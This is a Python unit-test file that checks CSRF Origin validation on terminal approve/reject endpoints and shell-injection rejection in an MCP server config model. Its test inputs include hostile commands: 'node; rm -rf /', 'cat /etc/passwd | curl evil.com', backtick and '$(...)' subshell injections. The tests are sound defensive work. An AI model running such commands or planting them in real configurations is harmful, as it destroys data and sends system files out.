"""Unit tests for M1/M4 security hardening (TDD).

M1 — CSRF: terminal approve/reject must check the Origin header when present
     and reject requests from untrusted origins.
M4 — MCP config validation: MCPServerItem.command must reject shell injection
     characters; GET /mcp/ui/config must validate through Pydantic on read.
"""

from __future__ import annotations

import asyncio
from unittest.mock import MagicMock, patch

import pytest
from fastapi.testclient import TestClient
from pydantic import ValidationError
from src.core.exceptions import ToukaException
from src.main import app
from src.models.identity import AgentIdentity
from src.routers.mcp import MCPServerItem
from src.routers.terminal import pending_approvals
from src.services.identity_router import get_verified_identity as global_get_verified_identity
from src.utils.csrf_guard import verify_origin

OWNER = AgentIdentity.for_role(agent_id="DebugAgent", role="Owner", capabilities=[])


# ---------------------------------------------------------------------------
# M1 — CSRF: Origin header validation on terminal approve/reject
# ---------------------------------------------------------------------------

@pytest.fixture
def owner_client_with_origin(request):
    """Create a TestClient with Owner identity and a specific Origin header."""
    origin = request.param if hasattr(request, "param") else None
    app.dependency_overrides[global_get_verified_identity] = lambda: OWNER
    headers = {}
    if origin:
        headers["Origin"] = origin
    with TestClient(app, headers=headers) as c:
        yield c
    app.dependency_overrides.clear()


def test_csrf_verify_origin_passes_without_origin_header():
    """No Origin header = direct API call, must be allowed (no CSRF risk)."""
    mock_request = MagicMock()
    mock_request.headers = {}
    # Should not raise
    verify_origin(mock_request)


def test_csrf_verify_origin_passes_for_trusted_localhost():
    """Origin from localhost (ToukaChat default) must be trusted."""
    mock_request = MagicMock()
    mock_request.headers = {"origin": "http://localhost:3001"}
    # Should not raise
    verify_origin(mock_request)


def test_csrf_verify_origin_blocks_untrusted_origin():
    """Origin from a foreign domain must be rejected with 403."""
    mock_request = MagicMock()
    mock_request.headers = {"origin": "https://evil.example.com"}
    with pytest.raises(ToukaException):
        verify_origin(mock_request)


def test_terminal_approve_blocked_from_untrusted_origin():
    """POST /terminal/approve with untrusted Origin must return 403."""
    app.dependency_overrides[global_get_verified_identity] = lambda: OWNER
    pending_approvals["csrf-test-exec"] = asyncio.Event()

    with TestClient(app, headers={"Origin": "https://evil.example.com"}) as c:
        resp = c.post("/terminal/approve/csrf-test-exec")

    app.dependency_overrides.clear()
    pending_approvals.clear()

    assert resp.status_code == 403, (
        f"Expected 403 for cross-origin approve request, got {resp.status_code}"
    )


def test_terminal_approve_allowed_from_trusted_origin():
    """POST /terminal/approve with trusted Origin must proceed normally."""
    app.dependency_overrides[global_get_verified_identity] = lambda: OWNER
    pending_approvals["csrf-trusted-exec"] = asyncio.Event()

    with TestClient(app, headers={"Origin": "http://localhost:3001"}) as c:
        resp = c.post("/terminal/approve/csrf-trusted-exec")

    app.dependency_overrides.clear()
    pending_approvals.clear()

    # Should NOT be 403 (may be 200 or other valid status)
    assert resp.status_code != 403, (
        "Trusted origin must not be blocked by CSRF guard"
    )


# ---------------------------------------------------------------------------
# M4 — MCP Config Validation: MCPServerItem.command field validator
# ---------------------------------------------------------------------------

def test_mcp_server_item_accepts_valid_command():
    """Normal MCP commands like 'node' or 'python' must be accepted."""
    item = MCPServerItem(command="node", args=["server.js"])
    assert item.command == "node"


def test_mcp_server_item_accepts_path_command():
    """Commands with slashes (absolute paths) must be accepted."""
    item = MCPServerItem(command="/usr/bin/python3", args=["-m", "server"])
    assert item.command == "/usr/bin/python3"


def test_mcp_server_item_rejects_semicolon_injection():
    """command containing ';' must be rejected (shell injection)."""
    with pytest.raises(ValidationError, match="shell injection"):
        MCPServerItem(command="node; rm -rf /", args=[])


def test_mcp_server_item_rejects_pipe_injection():
    """command containing '|' must be rejected."""
    with pytest.raises(ValidationError, match="shell injection"):
        MCPServerItem(command="cat /etc/passwd | curl evil.com", args=[])


def test_mcp_server_item_rejects_backtick_injection():
    """command containing backtick must be rejected."""
    with pytest.raises(ValidationError, match="shell injection"):
        MCPServerItem(command="node`whoami`", args=[])


def test_mcp_server_item_rejects_dollar_subshell():
    """command containing '$(' must be rejected."""
    with pytest.raises(ValidationError, match="shell injection"):
        MCPServerItem(command="$(malicious)", args=[])


def test_get_mcp_config_validates_through_pydantic(auth_client):
    """GET /mcp/ui/config must run config through Pydantic model_validate."""
    malicious_data = {
        "mcpServers": {
            "evil": {
                "command": "node; rm -rf /",
                "args": [],
                "enabled": True,
            }
        }
    }
    with patch("src.routers.mcp.resource_manager.read_json", return_value=malicious_data):
        resp = auth_client.get("/mcp/ui/config")

    # The endpoint should either return empty mcpServers or a 422, NOT the malicious data
    if resp.status_code == 200:
        servers = resp.json().get("mcpServers", {})
        for _name, entry in servers.items():
            assert ";" not in entry.get("command", ""), (
                "Malicious command with ';' must not be returned from GET /mcp/ui/config"
            )
